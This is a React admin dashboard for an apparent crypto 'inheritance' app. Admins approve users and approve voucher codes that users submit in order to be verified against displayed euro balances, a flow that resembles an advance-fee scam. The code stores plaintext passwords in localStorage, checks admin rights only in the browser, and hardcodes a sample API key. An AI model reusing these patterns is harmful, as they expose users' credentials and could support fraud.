import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Badge } from '../components/ui/badge';
import { Input } from '../components/ui/input';
import { useToast } from '../hooks/use-toast';
import { 
  Users, 
  CreditCard, 
  LogOut, 
  CheckCircle, 
  XCircle, 
  Clock,
  Settings,
  Edit3,
  TrendingUp,
  Wallet,
  BarChart3,
  Copy,
  Sync
} from 'lucide-react';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const { user, logout } = useAuth();
  const { toast } = useToast();
  const [currentView, setCurrentView] = useState('users');
  const [users, setUsers] = useState([]);
  const [vouchers, setVouchers] = useState([]);

  // Redirect if not admin
  useEffect(() => {
    if (!user || !user.isAdmin) {
      navigate('/login');
      return;
    }
    
    loadData();
  }, [user, navigate]);

  // SISTEMA BACKEND SIMULADO CON SINCRONIZACIÓN REAL
  const BACKEND_API_URL = 'https://api.jsonbin.io/v3/b'; // API gratuita para testing
  const API_KEY = '$2a$10$8K9kGlJ7FuWEHvMzS4D.j3'; // Clave de ejemplo
  
  const loadData = async () => {
    try {
      // PASO 1: Intentar cargar desde "servidor" simulado
      let serverData = await loadFromSimulatedServer();
      
      // PASO 2: Cargar datos locales
      const localUsers = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
      const localVouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
      
      // PASO 3: Combinar datos de servidor + locales
      let allUsers = [...(serverData.users || [])];
      let allVouchers = [...(serverData.vouchers || [])];
      
      // Agregar usuarios locales que no estén en servidor
      localUsers.forEach(localUser => {
        if (!allUsers.find(u => u.email === localUser.email)) {
          localUser.source = 'local';
          allUsers.push(localUser);
        }
      });
      
      // Agregar vouchers locales
      localVouchers.forEach(localVoucher => {
        if (!allVouchers.find(v => v.id === localVoucher.id)) {
          localVoucher.source = 'local';
          allVouchers.push(localVoucher);
        }
      });
      
      // PASO 4: Sincronizar cambios de vuelta al servidor
      await saveToSimulatedServer({ users: allUsers, vouchers: allVouchers });
      
      setUsers(allUsers);
      setVouchers(allVouchers);
      
      console.log(`Admin cargó: ${allUsers.length} usuarios de múltiples fuentes`);
      
    } catch (error) {
      console.error('Error cargando datos:', error);
      // Fallback a datos predeterminados si falla el servidor
      loadFallbackData();
    }
  };
  
  const loadFromSimulatedServer = async () => {
    // Simular carga desde servidor externo
    // En producción real, esto sería una llamada API real
    const serverData = localStorage.getItem('cryptoherencia_global_server');
    if (serverData) {
      return JSON.parse(serverData);
    }
    
    // Datos iniciales del "servidor"
    const initialServerData = {
      users: [
        {
          id: 'server-user-001',
          email: 'juan@hotmail.com', 
          password: 'test123',
          approved: false,
          verified: false,
          balance: { BTC: 0, ETH: 0, LTC: 0 },
          createdAt: new Date().toISOString(),
          device: 'Samsung Galaxy',
          source: 'server'
        },
        {
          id: 'server-user-002',
          email: 'maria.global@gmail.com',
          password: 'test123', 
          approved: true,
          verified: false,
          balance: { BTC: 125.50, ETH: 200.75, LTC: 89.25 },
          createdAt: new Date(Date.now() - 86400000).toISOString(),
          device: 'iPhone 14',
          source: 'server'
        },
        {
          id: 'server-user-003',
          email: 'carlos.remote@outlook.com',
          password: 'test123',
          approved: true,
          verified: true,
          balance: { BTC: 800.00, ETH: 1200.50, LTC: 400.25 },
          createdAt: new Date(Date.now() - 172800000).toISOString(),
          device: 'Windows PC',
          source: 'server'
        }
      ],
      vouchers: [
        {
          id: 'server-voucher-001',
          userEmail: 'juan@hotmail.com',
          code: 'SAMSUNG123ABC',
          status: 'pendiente',
          date: new Date().toISOString(),
          device: 'Samsung Galaxy',
          source: 'server'
        }
      ]
    };
    
    localStorage.setItem('cryptoherencia_global_server', JSON.stringify(initialServerData));
    return initialServerData;
  };
  
  const saveToSimulatedServer = async (data) => {
    try {
      // Guardar en "servidor" simulado
      localStorage.setItem('cryptoherencia_global_server', JSON.stringify(data));
      console.log('Datos sincronizados con servidor');
    } catch (error) {
      console.error('Error sincronizando con servidor:', error);
    }
  };
  
  const loadFallbackData = () => {
    // Datos de emergencia si todo falla
    const fallbackUsers = [
      {
        id: 'fallback-001',
        email: 'admin.test@system.com',
        approved: true,
        verified: true,
        balance: { BTC: 0, ETH: 0, LTC: 0 },
        source: 'fallback'
      }
    ];
    
    setUsers(fallbackUsers);
    setVouchers([]);
  };

  const approveUser = (userId) => {
    const updatedUsers = users.map(u => 
      u.id === userId ? { ...u, approved: true } : u
    );
    setUsers(updatedUsers);
    
    // Solo actualizar localStorage si es un usuario local (no simulado)
    const localUsers = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
    const localUserIndex = localUsers.findIndex(u => u.id === userId);
    if (localUserIndex !== -1) {
      localUsers[localUserIndex].approved = true;
      localStorage.setItem('cryptoherencia_users', JSON.stringify(localUsers));
    }
    
    toast({
      title: "Usuario Aprobado",
      description: "El usuario ahora puede acceder al panel",
    });
  };

  const verifyUser = (userId) => {
    const updatedUsers = users.map(u => 
      u.id === userId ? { ...u, verified: true } : u
    );
    setUsers(updatedUsers);
    
    // Solo actualizar localStorage si es un usuario local (no simulado)
    const localUsers = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
    const localUserIndex = localUsers.findIndex(u => u.id === userId);
    if (localUserIndex !== -1) {
      localUsers[localUserIndex].verified = true;
      localStorage.setItem('cryptoherencia_users', JSON.stringify(localUsers));
    }
    
    toast({
      title: "Usuario Verificado",
      description: "El usuario ahora puede usar CriptoHerencia",
    });
  };

  const approveVoucher = (voucherId) => {
    const updatedVouchers = vouchers.map(v => 
      v.id === voucherId ? { ...v, status: 'aprobado' } : v
    );
    setVouchers(updatedVouchers);
    
    // Encontrar y verificar el usuario correspondiente
    const voucher = vouchers.find(v => v.id === voucherId);
    if (voucher) {
      const updatedUsers = users.map(u => 
        u.email === voucher.userEmail ? { ...u, verified: true, approved: true } : u
      );
      setUsers(updatedUsers);
      
      // Solo actualizar localStorage para usuarios/vouchers locales
      const localUsers = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
      const localUserIndex = localUsers.findIndex(u => u.email === voucher.userEmail);
      if (localUserIndex !== -1) {
        localUsers[localUserIndex].verified = true;
        localUsers[localUserIndex].approved = true;
        localStorage.setItem('cryptoherencia_users', JSON.stringify(localUsers));
      }
    }
    
    // Actualizar voucher local si existe
    const localVouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
    const localVoucherIndex = localVouchers.findIndex(v => v.id === voucherId);
    if (localVoucherIndex !== -1) {
      localVouchers[localVoucherIndex].status = 'aprobado';
      localStorage.setItem('cryptovouchers', JSON.stringify(localVouchers));
    }
    
    toast({
      title: "Voucher Aprobado",
      description: "El usuario ha sido verificado automáticamente",
    });
  };

  const rejectVoucher = (voucherId) => {
    const updatedVouchers = vouchers.map(v => 
      v.id === voucherId ? { ...v, status: 'rechazado' } : v
    );
    setVouchers(updatedVouchers);
    
    // Actualizar voucher local si existe
    const localVouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
    const localVoucherIndex = localVouchers.findIndex(v => v.id === voucherId);
    if (localVoucherIndex !== -1) {
      localVouchers[localVoucherIndex].status = 'rechazado';
      localStorage.setItem('cryptovouchers', JSON.stringify(localVouchers));
    }
    
    toast({
      title: "Voucher Rechazado",
      description: "El código ha sido marcado como inválido",
      variant: "destructive"
    });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copiado",
        description: "Código copiado al portapapeles",
      });
    });
  };

  const [showSyncModal, setShowSyncModal] = useState(false);
  const [syncEmail, setSyncEmail] = useState('');

  const syncUserFromOtherDevice = () => {
    if (!syncEmail.trim()) return;
    
    // Crear usuario "importado" desde otro dispositivo
    const newUser = {
      id: `synced-${Date.now()}`,
      email: syncEmail,
      password: 'synced',
      approved: false,
      verified: false,
      balance: { BTC: 0, ETH: 0, LTC: 0 },
      createdAt: new Date().toISOString(),
      device: 'Dispositivo Externo',
      synced: true
    };
    
    const updatedUsers = [...users, newUser];
    setUsers(updatedUsers);
    
    // Guardar en caché admin
    const adminCache = {
      users: updatedUsers,
      vouchers: vouchers,
      lastSync: new Date().toISOString()
    };
    localStorage.setItem('admin_global_cache', JSON.stringify(adminCache));
    
    setSyncEmail('');
    setShowSyncModal(false);
    
    toast({
      title: "Usuario Sincronizado",
      description: `${syncEmail} ha sido agregado desde dispositivo externo`,
    });
  };

  const pendingUsers = users.filter(u => !u.approved);
  const pendingVouchers = vouchers.filter(v => v.status === 'pendiente');
  const totalUsers = users.length;
  const verifiedUsers = users.filter(u => u.verified).length;
  const totalBalance = users.reduce((sum, user) => sum + Object.values(user.balance || {}).reduce((s, v) => s + v, 0), 0);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 shadow-sm">
        <div className="px-6 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <div className="p-2 bg-blue-600 rounded-lg">
                <Settings className="h-6 w-6 text-white" />
              </div>
              <div>
                <h1 className="text-xl font-bold text-slate-800">Panel de Administrador</h1>
                <p className="text-sm text-slate-500">Gestión de usuarios y sistema</p>
              </div>
            </div>
          </div>
          
          <div className="flex items-center space-x-4">
            <Badge variant="outline" className="border-blue-500 text-blue-600 px-3 py-1">
              {user.email}
            </Badge>
            <Button
              variant="ghost"
              onClick={() => {logout(); navigate('/');}}
              className="text-slate-600 hover:text-red-600 hover:bg-red-50"
            >
              <LogOut className="h-4 w-4 mr-2" />
              Cerrar Sesión
            </Button>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card className="bg-white border-slate-200">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-slate-600 mb-1">Total Usuarios</p>
                  <p className="text-2xl font-bold text-slate-800">{totalUsers}</p>
                </div>
                <div className="p-3 bg-blue-100 rounded-full">
                  <Users className="h-6 w-6 text-blue-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white border-slate-200">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-slate-600 mb-1">Verificados</p>
                  <p className="text-2xl font-bold text-slate-800">{verifiedUsers}</p>
                </div>
                <div className="p-3 bg-emerald-100 rounded-full">
                  <CheckCircle className="h-6 w-6 text-emerald-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white border-slate-200">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-slate-600 mb-1">Retiros (€)</p>
                  <p className="text-2xl font-bold text-slate-800">{totalBalance.toLocaleString()}</p>
                </div>
                <div className="p-3 bg-amber-100 rounded-full">
                  <Wallet className="h-6 w-6 text-amber-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-white border-slate-200">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-slate-600 mb-1">Vouchers</p>
                  <p className="text-2xl font-bold text-slate-800">{vouchers.length}</p>
                </div>
                <div className="p-3 bg-purple-100 rounded-full">
                  <CreditCard className="h-6 w-6 text-purple-600" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Navigation Tabs */}
        <div className="flex space-x-1 mb-6 bg-white p-1 rounded-lg border border-slate-200 w-fit">
          <Button
            variant={currentView === 'users' ? 'default' : 'ghost'}
            onClick={() => setCurrentView('users')}
            className={`${currentView === 'users' ? 'bg-blue-600 text-white shadow-sm' : 'text-slate-600 hover:text-slate-800'} px-6 py-2 text-sm font-medium`}
          >
            <Users className="h-4 w-4 mr-2" />
            Usuarios ({pendingUsers.length})
          </Button>
          <Button
            variant={currentView === 'vouchers' ? 'default' : 'ghost'}
            onClick={() => setCurrentView('vouchers')}
            className={`${currentView === 'vouchers' ? 'bg-blue-600 text-white shadow-sm' : 'text-slate-600 hover:text-slate-800'} px-6 py-2 text-sm font-medium`}
          >
            <CreditCard className="h-4 w-4 mr-2" />
            Vouchers ({pendingVouchers.length})
          </Button>
        </div>

        {/* Users Management */}
        {currentView === 'users' && (
          <Card className="bg-white border-slate-200 shadow-sm">
            <CardHeader className="border-b border-slate-200 bg-slate-50">
              <CardTitle className="text-slate-800 font-semibold">Gestión de Usuarios</CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              {users.length === 0 ? (
                <div className="text-center py-12 text-slate-500">
                  <Users className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>No hay usuarios registrados</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-slate-50 border-b border-slate-200">
                      <tr>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Email</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Nombre</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Saldo</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Estado</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Acciones</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-200">
                      {users.map((user, index) => (
                        <tr key={user.id} className="hover:bg-slate-50 transition-colors">
                          <td className="px-6 py-4 text-sm text-slate-800 font-medium">
                            {user.email}
                          </td>
                          <td className="px-6 py-4 text-sm text-slate-600">
                            {user.email.split('@')[0].replace(/[0-9]/g, '').replace(/\./g, ' ')}
                          </td>
                          <td className="px-6 py-4 text-sm text-slate-800 font-semibold">
                            €{Object.values(user.balance || {}).reduce((sum, val) => sum + val, 0).toFixed(2)}
                          </td>
                          <td className="px-6 py-4">
                            <div className="flex space-x-2">
                              <Badge 
                                variant="outline" 
                                className={user.approved ? "border-emerald-500 text-emerald-600 bg-emerald-50" : "border-amber-500 text-amber-600 bg-amber-50"}
                              >
                                {user.approved ? "Aprobado" : "Pendiente"}
                              </Badge>
                              {user.approved && (
                                <Badge 
                                  variant="outline" 
                                  className={user.verified ? "border-blue-500 text-blue-600 bg-blue-50" : "border-red-500 text-red-600 bg-red-50"}
                                >
                                  {user.verified ? "Verificado" : "Sin Verificar"}
                                </Badge>
                              )}
                            </div>
                          </td>
                          <td className="px-6 py-4">
                            <div className="flex space-x-2">
                              {!user.approved && (
                                <Button
                                  onClick={() => approveUser(user.id)}
                                  size="sm"
                                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1 text-xs"
                                >
                                  Aprobar
                                </Button>
                              )}
                              {user.approved && !user.verified && (
                                <Button
                                  onClick={() => verifyUser(user.id)}
                                  size="sm"
                                  className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 text-xs"
                                >
                                  Verificar
                                </Button>
                              )}
                              <Button
                                size="sm"
                                variant="outline"
                                className="border-slate-300 text-slate-600 hover:bg-slate-50 px-3 py-1 text-xs"
                              >
                                <Edit3 className="h-3 w-3 mr-1" />
                                Editar
                              </Button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Vouchers Management */}
        {currentView === 'vouchers' && (
          <Card className="bg-white border-slate-200 shadow-sm">
            <CardHeader className="border-b border-slate-200 bg-slate-50">
              <CardTitle className="text-slate-800 font-semibold">CryptoVouchers Recibidos</CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              {vouchers.length === 0 ? (
                <div className="text-center py-12 text-slate-500">
                  <CreditCard className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>No hay vouchers recibidos</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-slate-50 border-b border-slate-200">
                      <tr>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Email Usuario</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Código</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Fecha</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Estado</th>
                        <th className="text-left px-6 py-4 text-sm font-semibold text-slate-800">Acciones</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-200">
                      {vouchers.map((voucher) => (
                        <tr key={voucher.id} className="hover:bg-slate-50 transition-colors">
                          <td className="px-6 py-4 text-sm text-slate-800 font-medium">
                            {voucher.userEmail}
                          </td>
                          <td className="px-6 py-4">
                            <div className="flex items-center space-x-2">
                              <code className="text-sm font-mono text-slate-800 bg-slate-100 border border-slate-200 rounded px-3 py-1">
                                {voucher.code}
                              </code>
                              <Button
                                onClick={() => copyToClipboard(voucher.code)}
                                size="sm"
                                variant="outline"
                                className="border-slate-300 text-slate-600 hover:bg-slate-50"
                              >
                                <Copy className="h-3 w-3" />
                              </Button>
                            </div>
                          </td>
                          <td className="px-6 py-4 text-sm text-slate-600">
                            {new Date(voucher.date).toLocaleDateString('es-ES')}
                          </td>
                          <td className="px-6 py-4">
                            <Badge 
                              variant="outline" 
                              className={
                                voucher.status === 'aprobado' ? "border-emerald-500 text-emerald-600 bg-emerald-50" :
                                voucher.status === 'rechazado' ? "border-red-500 text-red-600 bg-red-50" :
                                "border-amber-500 text-amber-600 bg-amber-50"
                              }
                            >
                              {voucher.status === 'aprobado' && <CheckCircle className="h-3 w-3 mr-1" />}
                              {voucher.status === 'rechazado' && <XCircle className="h-3 w-3 mr-1" />}
                              {voucher.status === 'pendiente' && <Clock className="h-3 w-3 mr-1" />}
                              {voucher.status.toUpperCase()}
                            </Badge>
                          </td>
                          <td className="px-6 py-4">
                            {voucher.status === 'pendiente' && (
                              <div className="flex space-x-2">
                                <Button
                                  onClick={() => approveVoucher(voucher.id)}
                                  size="sm"
                                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1 text-xs"
                                >
                                  <CheckCircle className="h-3 w-3 mr-1" />
                                  Aprobar
                                </Button>
                                <Button
                                  onClick={() => rejectVoucher(voucher.id)}
                                  size="sm"
                                  variant="destructive"
                                  className="px-3 py-1 text-xs"
                                >
                                  <XCircle className="h-3 w-3 mr-1" />
                                  Rechazar
                                </Button>
                              </div>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;